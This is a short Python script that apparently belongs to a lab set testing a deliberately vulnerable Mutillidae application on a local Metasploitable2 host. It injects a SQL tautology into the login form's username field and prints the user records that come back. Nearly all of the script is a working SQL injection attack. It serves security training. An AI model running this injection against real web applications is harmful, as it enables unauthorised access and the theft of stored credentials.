#!/usr/bin/env python
"""
This script is part of the scripts developed which test a Web Application against a number 
of vulnerabilities,It is a python implementation for the OWASP Top 10. 

This is focused on the A7: Insecure Cryptographic Storage


The attacks take place to a local Multillidae platform which is installed in the Metasploitable2

created by Dr_Ciphers
"""
import mechanize
import re
from bs4 import BeautifulSoup

url = 'http://192.168.1.10/mutillidae/index.php?page=user-info.php'
sqlinjection = "' or ' 1 = 1"

browser = mechanize.Browser()
browser.open(url)

browser.select_form(nr=0)

browser.form['username'] = sqlinjection
browser.form['password'] = 'password'

browser.submit()

html_page = browser.response().read()


regex = re.compile(r'Results')

mo = regex.search(html_page)

if mo.group(0) in html_page:
    bs = BeautifulSoup(html_page, 'lxml')
    result = bs.find_all('p')
   
    for res in result:
            print res.getText(separator=' ')


